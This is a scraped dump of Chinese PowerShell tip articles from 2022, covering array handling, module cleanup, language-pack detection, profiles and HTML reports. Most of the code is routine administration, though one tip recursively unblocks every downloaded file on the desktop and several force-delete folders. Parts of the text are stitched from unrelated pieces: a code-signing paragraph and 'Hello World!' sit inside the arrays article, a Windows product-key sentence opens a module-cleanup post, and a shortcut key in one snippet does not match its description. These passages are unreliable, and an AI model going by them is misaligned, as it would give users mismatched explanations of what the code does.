是否真正存在。让我们解决第一部分： 可以这样检索所有可用语言 ID 的列表： 1[CultureInfo]::GetCultures([Globalization.CultureTypes]::SpecificCultures) 这将创建一个哈希表，可轻松查找使用连字符的 ID（因为 Web URL 通常仅使用带有连字符的 ID）： 123$h = [CultureInfo]::GetCultures([Globalization.CultureTypes]::SpecificCultures) |Where-Object {$_ -like '*-*' } |Group-Object -Property Name -AsHashTable 现在，我们可以获取可用语言 ID 的列表，我们也可以查找其显示名称： 1234567# list all languages:$h.KeysPS C:\\&gt; $h['de-de'].DisplayNameGerman (Germany) 要获取可能的 URL 的列表，只需遍历所有可用的语言 ID，然后将它们一个接一个地插入 URL 即可。 请注意，我如何将占位符（{0}）替换为特定语言的 ID，例如 “en -us”：使用操作符 -f 来格式化，然后在循环体中插入语言 ID： 123456$URL = 'https://docs.microsoft.com/{0}/powershell/scripting/lang-spec/chapter-01'$list = $h.Keys | ForEach-Object { $URL -f $_ }$list 我们现在有一个可能的 URL 列表。 在第二部分中，我们将检查此列表以查看实际存在哪些 URL。","link":"/2022/06/13/identifying-multi-language-online-documents-part-1/"},{"title":"PowerShell 技能连载 - 请注意数组","text":"使用 PowerShell，您永远不知道 cmdlet 是返回数组还是单个对象。这是因为当命令返回多个项目时，PowerShell 会自动将结果包装成一个数组： 1234567# no array:$test = Get-Service -Name Spooler$test -is [Array]# array:$test = Get-Service -Name S*$test -is [Array] 理解这一点非常重要，因为这意味着运行时条件可以确定变量的性质。这可能会导致坏的结果。这是演示该问题的一个示例： 下面的代码返回以 “C” 开头的所有服务名称，然后获取第一个服务名称。这是可能的，因为不仅有一个以 “C” 开头的服务，因此 PowerShell 返回一个数组，保存在 $servicenames 中，然后您可以在此数组中使用数字索引来选择特定的元素： 1234567$Name = 'c*'# get service names$servicenames = Get-Service -Name $Name | Select-Object -ExpandProperty Name# get first service name$servicenames[0] 但是，您不能假设 $servicenames 始终是一个数组。如果在运行时只有一项与您的请求匹配的服务，则结果不再是一个数组，而是直接是服务名称。 为什么（以及何时）这么重要？当您的代码采用特定数组功能的那一刻，它变得重要，因为在某些情况下可能不存在该功能或行为不同。 为了说明这一点，下面的代码列出了现在以 “cry” 开头的所有服务。只有一项服务与请求匹配。因此，$servicenames 不再是一个数组。现在是一个字符串。当您在字符串上使用索引时，您会从该字符串中获取特定字母。 现在，相同的代码返回一个字符，而不是服务名称： 1234567$Name = 'cry*'# get service names$servicenames = Get-Service -Name $Name | Select-Object -ExpandProperty Name# get first service name$servicenames[0] 这些示例似乎有点人为构造的情况。但是您可以在许多难以发现的脚本错误中找到这个问题。因此，重要的是要始终确保您在代码使用数组功能时真正获得数组。 确保您获得数组的一种简单方法是这个结构 @()：括号中的任何内容都以数组的形式返回。这就是为什么无论命令是否返回一个或多个结果，下面代码都有效的原因： 1234567$Name = 'cry*'# get service names$servicenames = @(Get-Service -Name $Name | Select-Object -ExpandProperty Name)# get first service name$servicenames[0] 要将数字签名添加到 PowerShell 脚本文件（或其他能够为此问题携带数字签名的文件），请使用 Set-AuthenticodeSignature。运行以下演示代码（根据需要调整文件和证书的路径）： 1234567$Name = 'cry*'# get service names[array]$servicenames = Get-Service -Name $Name | Select-Object -ExpandProperty Name# get first service name$servicenames[0] 运行此代码时，在 $Path 中指定的脚本文件将打开并显示添加到脚本底部的数字签名： Hello World! 1234567$Name = 'cry*'# get service names[string[]]$servicenames = Get-Service -Name $Name | Select-Object -ExpandProperty Name# get first service name$servicenames[0] 但是，[array] 更容易使用，因为无论数据类型如何，它总是可以使用，并且 [array] 对不熟悉类型的用户也更友好。","link":"/2022/06/17/careful-with-arrays/"},{"title":"PowerShell 技能连载 - PowerShell 扩展的重要更新","text":"如果您过去曾尝试过 VS Code，但由于速度和稳定性而感到失望，那么您现在可能想再次看一下。5 月 3 日，Powershell 团队的 Sydney Smith 宣布对 PowerShell 扩展进行了重大改革和重写。 具体而言，核心管道的执行已重新设计，IntelliSense 等编辑服务现在以单独的同步线程运行，以实现更高的速度、更少的阻塞和竞态条件。 在 Windows 上，稳定的的 Powershell ISE 仍然可以使用，并有许多粉丝。在其他平台上，或有更复杂的或多种编程语言的项目，那么是时候给 VS Code 第二次机会，如果您刚开始选择的话。 在这儿阅读完整的声明：https://devblogs.microsoft.com/powershell/major-update-to-the-powershell-extension-for-visual-studio-code/","link":"/2022/06/21/major-update-for-powershell-extensions/"},{"title":"PowerShell 技能连载 - 解锁多个文件","text":"当您从 Internet 下载文件，或将文件从不信任源复制到 NTFS 文件系统的驱动器时，Windows 将秘密的 NTFS 流添加到这些文件中，以作为额外的安全性层。 “锁定”的文件将无法执行，并且像 DLL 这样的“锁定”二进制文件无法被加载。这就是为什么在使用此类文件之前取消锁定这些文件的原因。从本质上讲，是通过删除隐藏的 NTFS 流来完成解密，该流将文件标记为来自“不受信任的来源”。 PowerShell 用 Unblock-File cmdlet 清除文件的隐藏的 NTFS 流。要解开多个文件，即整个子文件夹的完整内容，只需使用 Get-ChildItem 并将结果通过管道输送来解开文件： 1Get-ChildItem -Path $home\\desktop -File -Recurse | Unblock-File","link":"/2022/06/23/unblocking-multiple-files/"},{"title":"PowerShell 技能连载 - 快速查找过期的 PowerShell 模块","text":"在最简单的情况下，您可以仅使用单行代码（删除 -WhatIf 以实际执行更新）检查所有已安装的模块以进行更新： 1PS C:\\&gt; Get-InstalledModule | Update-Module -WhatIf Get-InstalledModule 列出了以“托管”方式安装的所有模块（使用 Install-Module），并包含有关该模块的安装位置的信息（即 PowerShell Gallery 网站）。这就是 Update-Module 用来检查新版本所需要的信息。 如果您只是想看看是否有模块需要更新，并且仅专注于 PowerShell Gallery 安装的模块，那么以下是检查更新的一种更快的方法： 1234567891011121314151617181920212223242526272829303132333435363738function Test-GalleryModuleUpdate{ param ( [Parameter(Mandatory,ValueFromPipelineByPropertyName)] [string] $Name, [Parameter(Mandatory,ValueFromPipelineByPropertyName)] [version] $Version, [switch] $NeedUpdateOnly ) process { $URL = &quot;https://www.powershellgallery.com/packages/$Name&quot; $page = Invoke-WebRequest -Uri $URL -UseBasicParsing -Maximum 0 -ea Ignore [version]$latest = Split-Path -Path $page.Headers.Location -Leaf $needsupdate = $Latest -gt $Version if ($needsupdate -or (!$NeedUpdateOnly.IsPresent)) { [PSCustomObject]@{ ModuleName = $Name CurrentVersion = $Version LatestVersion = $Latest NeedsUpdate = $needsupdate } } }}Get-InstalledModule | Where-Object Repository -eq PSGallery | Test-GalleryModuleUpdate #-NeedUpdateOnly Test-GalleryModuleUpdate 函数读取了 Get-InstalledModule 返回的模块，并检查在 powershellgallery.com 上是否发布了新版本。此检查是由通过解析 URL 快速完成的。如果添加 -NeedUpdateOnly switch 参数，则 Test-GalleryModuleUpdate 仅返回需要更新的模块（可能没有结果）。 这是示例输出： ModuleName CurrentVersion LatestVersion NeedsUpdate ---------- -------------- ------------- ----------- ImportExcel 7.5.2 7.5.3 True PSEventViewer 1.0.17 1.0.22 True Az.Tools.P... 0.5.0 1.0.1 True Microsoft.... 16.0.21116.... 16.0.22413... True MicrosoftT... 2.3.1 4.4.1 True PSReadLine 2.2.2 2.2.5 True PSWriteHTML 0.0.172 0.0.174 True ...","link":"/2022/06/27/quickly-finding-outdated-powershell-modules/"},{"title":"PowerShell 技能连载 - 清理 PowerShell 模块（第 1 部分）","text":"有很多脚本可以通过转换一系列二进制值来读取注册表中原始的 Windows 10 产品密钥。 在这个迷你系列的第一部分中，我们将查看 PowerShell 保存其模块的位置，以及您可以采取什么措施删除不再需要的模块。 最安全的方法是完全专注于通过 Install-Module 安装的模块，因为这样您永远不会意外删除 Windows 或属于其他软件产品的一部分的模块。 这行代码列出了由 Install-Module 安装的所有模块，并让您选择要（永久）删除的模块。 1234Get-InstalledModule | Out-GridView -Title 'Select module(s) to permanently delete' -PassThru | Out-GridView -Title 'Do you REALLY want to remove the modules below? CTRL+A and OK to confirm' -PassThru | Uninstall-Module 注意：如果模块安装在 “AllUsers” 范围中，则可能需要管理员特权。 注意：删除模块时，它将从硬盘驱动器中永久删除。确保您知道它发布了哪些 cmdlet，并且确信不再需要它们。如果您不小心删除了模块，则可以随时通过 Install-Module 重新安装它。","link":"/2022/06/29/cleaning-up-powershell-modules-part-1/"},{"title":"PowerShell 技能连载 - 清理 PowerShell 模块（第 2 部分）","text":"在第一部分中，我们研究了如何删除通过 “Install-Module“ 安装的 PowerShell 模块。如果您不再需要它们，则可以手动删除这些 PowerShell 模块。毕竟它们只是文件夹。 这段的代码列出了所有可用的 PowerShell 模块，并让您选择要删除的模块。 12345678910# folders where PowerShell looks for modules:$paths = $env:PSModulePath -split ';'# finding actual module folders$modules = Get-ChildItem -Path $paths -Depth 0 -Directory | Sort-Object -Property Name$modules | Select-Object -Property Name, @{N='Parent';E={$_.Parent.FullName}}, FullName | Out-GridView -Title 'Select module(s) to permanently delete' -PassThru | Out-GridView -Title 'Do you REALLY want to remove the modules below? CTRL+A and OK to confirm' -PassThru | Remove-Item -Path { $_.FullName } -Recurse -Force -WhatIf # remove -WhatIf to actually delete (as always at own risk) 注意：如果模块安装在 “AllUsers” 范围中，则可能需要管理员特权。 注意：删除模块时，它将从硬盘驱动器中永久删除。确保您知道它发布了哪些 cmdlet，并且确信不再需要它们。","link":"/2022/07/01/cleaning-up-powershell-modules-part-2/"},{"title":"PowerShell 技能连载 - 清理 PowerShell 模块（第 3 部分）","text":"在第一部分和第二部分中，我们全面学习了如何删除 PowerShell 模块。在这最后一部分中，我们将研究您可能不再需要的 PowerShell 模块版本。 每当将 PowerShell 模块更新为新版本时，新版本就可以与所有旧版本并行保存。这个设计方式很聪明，因为这可以方便您更新模块，即使它们当前正在使用。 然而，这种设计也导致了越来越多的垃圾。除非您无需明确地退回到旧版本的模块，否则通常只需要最新版本的模块。 这就是为什么下面的脚本列出模块的多个可用版本，然后让用户决定应清理哪一个： 123456789101112131415161718192021222324252627282930313233# script may require Administrator privileges if you want to remove# module versions installed in &quot;AllUsers&quot; scope# find ALL modules with more than one version and/or location:$multiversion = Get-Module -ListAvailable | Group-Object -Property Name | Sort-Object -Property Name | Where-Object Count -gt 1# ask user WHICH of these modules to clean?$clean = $multiversion | Select-Object -Property @{N='Versions';E={$_.Count}}, @{N='ModuleName';E={$_.Name}} | Out-GridView -Title 'Select module(s) to clean' -PassThru# get the todo list with the modules the user wants to clean:$todo = $multiversion | Where-Object Name -in $clean.ModuleName$todo | ForEach-Object { $module = $_.Name # list all versions of a given module and let the user decide which versions # to keep and which to remove: $_.Group | Select-Object -Property Version, ModuleBase, ReleaseNotes | Sort-Object -Property Version | Out-GridView -Title &quot;Module $module : Select all versions that you want to remove&quot; -PassThru | Select-Object -ExpandProperty ModuleBase | # do a last confirmation dialog before permanently deleting the subversions: Out-GridView -Title 'Do you really want to permanently delete these folders? CTRL+A and OK to confirm' -PassThru | Remove-Item -Recurse -Force } 一旦用户选择一个或多个模块要清理，脚本一次会处理一个模块，并列出其所有版本。然后，用户可以选择要删除的版本。 请注意，您可能需要管理员特权才能删除 “AllUsers” 范围中安装的模块版本。","link":"/2022/07/05/cleaning-up-powershell-modules-part-3/"},{"title":"PowerShell 技能连载 - 下载文件","text":"可以通过许多方法实现简单的文件下载。例如，使用 Invoke-RestMethod、Invoke-WebRequest 或通过 BitsTransfer 模块。 如果您需要下载流式内容，那么需要更复杂的命令。在 Windows 机器上，您可以下载并安装 PSODownloader 模块： 1Install-Module -Name PSODownloader -Scope CurrentUser 它为您提供了一个更简单的 cmdlet：Invoke-DownloadFile。您可以先将要下载的 URL 复制到剪贴板然后调用该命令，或者使用 -Url 参数。 在此可以查看更多信息： https://github.com/TobiasPSP/Modules.PsoDownloader","link":"/2022/07/07/downloading-files-2/"},{"title":"PowerShell 技能连载 - 恢复被浪费的硬盘空间","text":"当软件收到更新时，它往往并不会清除之前不需要的更新。这些过期的“补丁文件”积累在 C:\\Windows\\installer 文件夹下，其中有许多 *.msp 文件。由于您不知道那些 *.msp 文件还会被用到，以及哪个文件可以安全地删除，所以不太容易恢复空间。除非您拥有 Administrator 特权（需要它才能处理存储在 Windows 文件夹中的数据）并使用 PowerShell。 只需要下载该模块（需要 Administrator 特权）： 1Install-Module -Name MSIPatches 下一步，以 Administrator 特权启动一个 PowerShell 控制台，并像这样查看可恢复的空间： 123456789PS&gt; Get-MsiPatchTotalPatchCount : 19TotalPatchSize : 0,96 GBInstalledPatchCount : 5InstalledPatchSize : 0,32 GBOrphanedPatchCount : 14OrphanedPatchSize : 3,64 GB “Orphaned Patch Size” 可能是 0 到好几 GB 之间的任意值。在一个系统上，由于安装了 Office 2016，我恢复了 45GB 的孤儿补丁（显然没有清理已安装的更新）。 要真正清理不必要的补丁，请使用此行代码（需要管理员特权）： 1Get-OrphanedPatch | Move-OrphanedPatch -Destination C:\\Backup 这样，您可以在安全的地方“隔离”补丁文件一段时间。不过，不要忘记在某个时间点清空目标文件夹。或者，您当然可以立即删除孤立的补丁。不过，无论您做什么，都要自担风险。","link":"/2022/07/11/recovering-wasted-hard-drive-space/"},{"title":"PowerShell 技能连载 - 在 PowerShell 中粘贴多行","text":"当您复制多行 PowerShell 代码并将其粘贴到 Shell 窗口中时，结果通常不是您所期望的。PowerShell 开始执行第一行，不会以整块的方式执行粘贴的代码。试着复制下面的代码，然后将其粘贴到 PowerShell 控制台窗口中来查看默认行为： 1234&quot;Starting!&quot;$a = Read-Host -Prompt 'Enter something'&quot;Entered: $a&quot;&quot;Completed&quot; 粘贴块的每一行都是单独执行的，在每个输出行之前，可以看到命令提示符。 尽管此默认行为也可正常执行，但是如果您希望确保整个代码块作为一个整体执行，则将其嵌入大括号中，并用 “.“ 执行此脚本块。尝试复制这段代码： 123456. { &quot;Starting!&quot; $a = Read-Host -Prompt 'Enter something' &quot;Entered: $a&quot; &quot;Completed&quot;} 当您粘贴此代码时，它会像从脚本文件中存储并加载它一样作为一个整体执行。","link":"/2022/07/13/pasting-multiple-lines-in-powershell/"},{"title":"PowerShell 技能连载 - 在选中的代码中运行 $PSScriptRoot","text":"PowerShell 代码中的最大陷阱之一是自动变量 $PSScriptRoot，它始终代表当前脚本所在的文件夹的路径。但是，这要求 (a)当前脚本实际上已经保存到文件中，并且 (b)您正在执行整个文件，即通过按 F5 执行。 当您仅使用 F8 执行选中的代码时，即使您选择了整个代码，$PSScriptRoot 也为空，因此也会导致您选择的代码执行错误。 但是，在 PowerShell ISE 中，添加一些代码就能很容易地实现在选中的代码中启用 $PSScriptRoot。这是您需要运行的代码： 123456789101112131415161718192021222324252627282930313233343536373839function Invoke-Selection{ try { # get the selected text: $selectedText = $psise.CurrentFile.Editor.SelectedText # if no text was selected... if ($selectedText.Length -eq 0) { # ...select the line the caret is in and get this line instead: $psise.CurrentFile.Editor.SelectCaretLine() $selectedText = $psise.CurrentFile.Editor.SelectedText } # try and parse the code $sb = [ScriptBlock]::Create($selectedText) # get the missing variable content from the underlying file: $currentFile = $psise.CurrentFile.FullPath $currentFolder = Split-Path -Path $currentFile # append the selected code with these automatic variables, and set them: $runcode = @&quot; `$PSCommandPath = '$currentFile' `$PSScriptRoot = '$currentFolder' $selectedText&quot;@ # turn text into script block... $scriptblock = [ScriptBlock]::Create($runcode) # ...and execute it without private scope: . $scriptblock } catch { throw $_.Exception }}$null = $psise.CurrentPowerShellTab.AddOnsMenu.Submenus.Add('ExecuteSelection', {. Invoke-Selection}, 'SHIFT+F8') 该代码向 ISE 添加了一个新命令，可以通过按 CTRL+F8 来调用该命令。现在，假设您选择了一段代码，这段代码包含了 $PSScriptRoot，您若希望运行它，只需按 CTRL+F8 而不是 F8，它将正常执行。 该快捷键调用了 Invoke-Selection 函数。此函数将接受当前选择的文本，添加缺少的自动变量 $PSScriptRoot 和 $PSCommandPath 到代码中，并根据当前脚本的当前文件路径来定义这些变量。然后执行脚本块。 这样，您现在可以调试并演示任何选中的代码，即使它包含自动变量。只需确保您将脚本保存在某个地方，以便 PowerShell 知道您的代码所在的位置。","link":"/2022/07/15/running-psscriptroot-in-selected-code/"},{"title":"PowerShell 技能连载 - 创建世界地图图像","text":"如果您有与国家/地区有关的数据，则可能需要可视化并突出显示此地理数据。经典的数据图标在这里不起作用。 幸运的是，PowerShell 可以使用免费的在线地理图表。这是您可以试试这个函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566function Show-MapGraph{ param ( [Parameter(Mandatory,ValueFromPipeline)] $InputObject, [Parameter(Mandatory)] [string] $Property, [string] $Label = 'Items' ) begin { $bucket = [System.Collections.ArrayList]::new() } process { $null = $bucket.Add($_) } end { $groups = $bucket | Where-Object { $_.$Property } | Group-Object -Property $Property -NoElement $data = foreach ($group in $groups) { &quot;['{0}',{1}]&quot; -f $group.Name, $group.Count } $datastring = $data -join &quot;`r`n,&quot; $HTMLPage = @&quot; google.charts.load('current', { 'packages':['geochart'], }); google.charts.setOnLoadCallback(drawRegionsMap); function drawRegionsMap() { var data = google.visualization.arrayToDataTable([ ['Country', '$Label'], $datastring ]); var options = { colorAxis: {colors: ['#00FF00', '#004400']}, backgroundColor: '#81d4fa', datalessRegionColor: '#AAAABB', defaultColor: '#f5f5f5', }; var chart = new google.visualization.GeoChart(document.getElementById('regions_div')); chart.draw(data, options); }&quot;@ $timestamp = Get-Date -Format 'HHmmss' $OutPath = &quot;$env:temp\\Graph$timestamp.html&quot; $HTMLPage | Out-File -FilePath $OutPath -Encoding utf8 Start-Process $outpath }} Show-MapGraph 基本原理是创建一个 HTML 网页，并通过适当的脚本调用填充它，然后显示它。您需要做的就是通过管道传入您的国家数据，并使用 -Property 指示对象的哪个属性包含国家名称。","link":"/2022/07/19/creating-world-map-graphs/"},{"title":"PowerShell 技能连载 - 确定语言包（第 1 部分）","text":"假设您需要查找 Windows 计算机已安装的语言包。在这个三部分的系列中，我们使用 PowerShell 的功能来解决此问题。 在第一部分中，我们只是尝试通过寻找可以利用的原生非 PowerShell 命令来解决问题。 事实证明，命令 dism.exe 可以为您找到该信息。但是，与许多二进制控制台命令一样，结果是 (a)本地化的，(b)字符串数据，(c)通常需要管理员特权。 如果我们别无选择，作为管理员，您可以运行以下代码： 1DISM.exe /Online /Get-Intl /English 接下来，您可以使用 PowerShell 功能过滤和解析信息，直到找到所需的内容为止。 例如，使用 Select-String 仅选择那些对您的任务有趣的行： 12DISM.exe /Online /Get-Intl /English | Select-String -SimpleMatch 'Installed language(s)' 结果看起来像这样： Installed language(s): de-DE Installed language(s): en-US Installed language(s): fr-FR 接下来，使用 PowerShell 管道机制处理每个结果并提取您真正需要的信息： 123DISM.exe /Online /Get-Intl /English | Select-String -SimpleMatch 'Installed language(s)' | ForEach-Object { $_.Line.Split(':')[-1].Trim() } 在这里，每次取出一行，然后由冒号分隔，然后取出最后一部分（右）部分，删除所有空格。这很麻烦，但最后能够获取原生字符串的数据的结果。 实际上，Select-String 支持正则表达方式。因此，如果您了解正则表达式，则可以立即查询所需的信息： 123DISM.exe /Online /Get-Intl /English | Select-String -Pattern 'Installed language\\(s\\):\\s(.*?)$' | ForEach-Object { $_.Matches[0].Groups[1].Value } 请注意，在代码示例中如何使用 -Pattern 参数并忽略 -SimplePattern 参数，从而告诉 Select-String 我们正在使用完整的正则表达式。现在，搜索模式使用 “\\“ 来转义所有特殊字符，并定义一组括号来定义我们要寻找的值，位于搜索文本之后和行末的 “$“ 之后）。 然后，Select-String 在其属性 “Matches“ 中返回正则表达式匹配，因此我们可以从这里以面向对象的方式访问发现的匹配和组。我们正在寻找的信息是在第一个匹配项中（每行，index 为 0），在第二组中（索引号 0 代表整个匹配，索引号 1 是第一个括号内的匹配项）。 如果这个操作对你来说太低级了，请期待下一个技能！","link":"/2022/07/21/determining-language-packs-part-1/"},{"title":"PowerShell 技能连载 - 确定语言包（第 2 部分）","text":"在本系列的第二部分中，我们希望通过使用内置的 PowerShell 功能来解决我们的难题 - 获得安装的语言包。在第一部分中，我们使用了可行的控制台应用程序 (dism.exe)，但很复杂，需要管理员特权。 Windows 机器上的面向对象的方法通常是 WMI，您可以在其中查询描述所需信息的类，并在不做字符串转换的情况下获取信息。WMI 的困难部分是找到合适的类名。 这是我们的解决方案： 12$os = Get-CIMInstance -ClassName Win32_OperatingSystem$os.MUILanguages 当您使用 dism.exe 将其与我们第一部分的解决方案进行比较时，您会立即发现它的速度更快，更方便。但是，两种方法最后都返回相同的信息。","link":"/2022/07/25/determining-language-packs-part-2/"},{"title":"PowerShell 技能连载 - 确定语言包（第 3 部分）","text":"在本系列的第二部分中，您已经看到了使用 WMI 与使用命令行工具（如 dism.exe）相比，使用 WMI 查询安装的操作系统语言列表要容易且快速得多。但是，WMI 仍然需要您知道适当的 WMI 类名称。 这就是为什么 PowerShell 全能的 Get-ComputerInfo 的原因。它为您查询各种与计算机相关的信息，然后由您决定需要哪个信息。我们也可以通过这种方法解决这个问题： 12$a = Get-ComputerInfo$a.OsMuiLanguages 不好的方面是，Get-ComputerInfo 总是查询完整的信息集，这使得执行起来很慢。不过总比没有好，甚至比 dism.exe 更好，但是第二部分的直接 WMI 查询仍然是最高效的方法。","link":"/2022/07/27/determining-language-packs-part-3/"},{"title":"PowerShell 技能连载 - 将语言 ID 转为语言名称","text":"在我们以前的迷你系列中，我们展示了使用不同的 PowerShell 方法来获取安装 OS 语言名称的几种方法。结果都是语言 ID 的列表，类似这样： de-DE en-US fr-FR 如果我需要将它们转换为完整的国家名称怎么办？幸运的是，这只是数据类型的问题。我们演示的所有方法都可以以字符串的形式返回安装的语言包。让我们以 WMI 示例为例： 12$os = Get-CIMInstance -ClassName Win32_OperatingSystem$os.MUILanguages 当您将结果转换到更合适的数据类型时，将获得合适的数据。相对于字符串，让我们使用表示国家名称的数据类型：CultureInfo！ 12$os = Get-CIMInstance -ClassName Win32_OperatingSystem[CultureInfo[]]$os.MUILanguages 瞬间，相同的数据现在可以以更丰富的格式表示： LCID Name DisplayName ---- ---- ----------- 1031 de-DE German (Germany) 1033 en-US English (United States) 1036 fr-FR French (France)","link":"/2022/07/29/converting-language-ids-in-language-names/"},{"title":"PowerShell 技能连载 - 记录变量类型","text":"作为调试和质量控制的一部分，您可能需要记录赋值给一个变量的数据。例如，您可能需要找出赋值给指定变量的实际数据类型是什么，以便以后可以以强类型的方式访问变量以增加安全性。 这是一个自定义验证器类，可以用于这类分析。只需先运行下面的代码。除了声明新属性外，它不做任何事情： 12345678910111213141516171819202122232425262728293031323334353637# create a new custom validation attribute named &quot;LogVariableAttribute&quot;:class IdentifyTypeAttribute : System.Management.Automation.ValidateArgumentsAttribute{ # this gets called whenever a new value is assigned to the variable: [void]Validate([object]$value, [System.Management.Automation.EngineIntrinsics]$engineIntrinsics) { # get the global variable that logs all changes: [System.Management.Automation.PSVariable]$variable = Get-Variable &quot;loggedTypes&quot; -Scope global -ErrorAction Ignore # if the variable exists and does not contain an ArrayList, delete it: if ($variable -ne $null -and $variable.Value -isnot [System.Collections.ArrayList]) { $variable = $null } # if the variable does not exist, set up an empty new ArrayList: if ($variable -eq $null) { $variable = Set-Variable -Name &quot;loggedTypes&quot; -Value ([System.Collections.ArrayList]@()) -Scope global -PassThru } [string]$line = (Get-PSCallStack)[-1].Position.Text $pattern = '\\$(\\w{1,})' $match = [regex]::Match($line, $pattern) if ($match.success) { # log the type contained in the variable $null = $variable.Value.Add([PSCustomObject]@{ # use the optional source name that can be defined by the attribute: Value = $value.GetType() Timestamp = Get-Date # use the callstack to find out where the assignment took place: Name = [regex]::Match($line, $pattern).Groups[1] Position = [regex]::Match($line, $pattern).Groups[1].Index + (Get-PSCallStack)[-1].Position.StartOffset Line = (Get-PSCallStack).ScriptLineNumber | Select-Object -Last 1 Path = (Get-PSCallStack).ScriptName | Select-Object -Last 1 }) } }} 现在，在您的脚本中，在开始时，通过添加新属性来初始化要跟踪的所有变量： 123456789101112131415161718[IdentifyType()]$test = 1[IdentifyType()]$x = 0# start using the variables:for ($x = 1000; $x -lt 3000; $x += 300){ &quot;Frequency $x Hz&quot; [Console]::Beep($x, 500)}&amp; { $test = Get-Date}$test = &quot;Hello&quot;Start-Sleep -Seconds 1 $test = 1,2,3 然后正常运行脚本。结果将记录到全局变量 $loggedTypes 中，通过它可以查看所有结果： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091# looking at the log results:$loggedTypes | Out-GridViewPS C:\\&gt; $loggedTypesValue : System.Int32Timestamp : 04.07.2022 09:42:46Name : testPosition : 17Line : 1Path :Value : System.Int32Timestamp : 04.07.2022 09:42:46Name : xPosition : 44Line : 2Path :Value : System.Int32Timestamp : 04.07.2022 09:42:46Name : xPosition : 89Line : 5Path :Value : System.Int32Timestamp : 04.07.2022 09:42:46Name : xPosition : 113Line : 5Path :Value : System.Int32Timestamp : 04.07.2022 09:42:47Name : xPosition : 113Line : 5Path :Value : System.Int32Timestamp : 04.07.2022 09:42:47Name : xPosition : 113Line : 5Path :Value : System.Int32Timestamp : 04.07.2022 09:42:48Name : xPosition : 113Line : 5Path :Value : System.Int32Timestamp : 04.07.2022 09:42:48Name : xPosition : 113Line : 5Path :Value : System.Int32Timestamp : 04.07.2022 09:42:49Name : xPosition : 113Line : 5Path :Value : System.Int32Timestamp : 04.07.2022 09:42:49Name : xPosition : 113Line : 5Path :Value : System.StringTimestamp : 04.07.2022 09:42:49Name : testPosition : 215Line : 16Path :Value : System.Object[]Timestamp : 04.07.2022 09:42:50Name : testPosition : 258Line : 18Path :","link":"/2022/08/02/logging-variable-types/"},{"title":"PowerShell 技能连载 - 利用用户配置文件的优势","text":"当 PowerShell 启动时，它会自动查找一个特殊的自动启动脚本。默认情况下该脚本不存在，并且对于每个 PowerShell 环境是不同的。$profile 变量体现它的路径。这是在我机器的 Windows PowerShell 控制台环境中的路径： 1C:\\Users\\tobias\\Documents\\WindowsPowerShell\\Microsoft.PowerShell_profile.ps1 可以快速地检测这个文件是否存在，如果不存在的话，用 PowerShell 创建它： 1234567$exists = Test-Path -Path $profileif ($exists -eq $false){ $null = New-Item -Path $profile -ItemType File -Force}notepad $profile 有了这样的自启动脚本后，您可以在您的每个 PowerShell 会话中添加各种有用的东西。例如，创建一个较短的命令行提示符： 12345function prompt{ 'PS&gt; ' $host.UI.RawUI.WindowTitle = Get-Location} 或通过简化的登录使生活更轻松： 12345678910function in365{ Import-Module ExchangeOnlineManagement Connect-ExchangeOnline -UserPrincipalName 'youremailhere'}function out365{ Disconnect-ExchangeOnline -Confirm:$false} 只需确保您保存更改以及执行策略允许脚本运行即可。","link":"/2022/09/29/take-advantage-of-your-profile/"},{"title":"PowerShell 技能连载 - 更新帮助","text":"如果您有时使用 Get-Help 和本地帮助，则应该偶尔运行 Update-Help 以更新本地帮助文件。在 Windows PowerShell 上，这需要本地管理特权，因为帮助文件存储在受保护的 Windows 文件夹中： 1PS&gt; Update-Help -UICulture en-us -Force 在 PowerShell 7 上，Update-Help 现在有一个附加的参数 -Scope CurrentUser，因此您也可以在没有管理员特权的情况下更新本地帮助。 更新本地帮助很重要，因为每当您运行它时，它都会动态地查看机器上存在的 PowerShell 模块，并仅下载关于它们的帮助。如果以后添加更多模块，则不要忘记再次运行更新——还可以下载新模块的帮助文件——前提是该模块尚未发布它们。 请注意，Update-Module 可能会在结束时发出红色错误消息。不用担心：通常，它仅是由几个没有帮助的模块引起的。错误消息并未表明整个更新过程有问题。","link":"/2022/10/03/update-help/"},{"title":"PowerShell 技能连载 - 使用 HTML 来创建 PDF 报告（第 1 部分）","text":"可以通过 HTML 轻松地将格式化的数据转换成输出报告。在这个三部分的系列中，我们首先说明您如何撰写 HTML 报告，然后展示一种将这些 HTML 报告转换为 PDF 文档的简单方法。 PowerShell 中有一个 ConvertTo-Html cmdlet，可以轻松将输出保存到 HTML 表格： 123456789$path = &quot;$env:temp\\report.html&quot;# get data from any cmdlet you wish$data = Get-Service | Sort-Object -Property Status, Name# output to HTML$data | ConvertTo-Html | Set-Content -Path $path -Encoding UTF8Invoke-Item -Path $path 最终的报告可能仍然很丑陋，但是添加 HTML 样式表可以轻松美化报告并添加您的公司设计： 1234567891011121314151617181920212223242526272829$path = &quot;$env:temp\\report.html&quot;# get data from any cmdlet you wish$data = Get-Service | Sort-Object -Property Status, Name# compose style sheet$stylesheet = &quot;&lt;style&gt;body { background-color:#AAEEEE;font-family:Monospace;font-size:10pt; }table,td, th { border:1px solid blue;}th { color:#00008B;background-color:#EEEEAA;font-size: 12pt;}table { margin-left:30px; }h2 {font-family:Tahoma;color:#6D7B8D;}h1{color:#DC143C;}h5{color:#DC143C;}&lt;/style&gt;&quot;# output to HTML$data | ConvertTo-Html -Title Report -Head $stylesheet | Set-Content -Path $path -Encoding UTF8Invoke-Item -Path $path","link":"/2022/10/05/using-html-to-create-pdf-reports-part-1/"},{"title":"PowerShell 技能连载 - 使用 HTML 来创建 PDF 报告（第 3 部分）","text":"HTML 方便地将数据格式化为输出报告。在这个最后的部分中，我们将介绍如何将最终 HTML 报告转换为 PDF，以便轻松地将其传递给同事和团队成员。 以下是我们在第二部分介绍的脚本： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960$path = &quot;$env:temp\\report.html&quot;# get data from any cmdlet you wish$data = Get-Service | Sort-Object -Property Status, Name# helper function to convert arrays to string listsfunction Convert-ArrayToStringList{ param ( [Parameter(Mandatory, ValueFromPipeline)] $PipelineObject ) process { $Property = $PipelineObject.psobject.Properties | Where-Object { $_.Value -is [Array] } | Select-Object -ExpandProperty Name foreach ($item in $Property) { $PipelineObject.$item = $PipelineObject.$item -join ',' } return $PipelineObject }}# compose style sheet$stylesheet = &quot; &lt;style&gt; body { background-color:#AAEEEE; font-family:Monospace; font-size:10pt; } table,td, th { border:1px solid blue;} th { 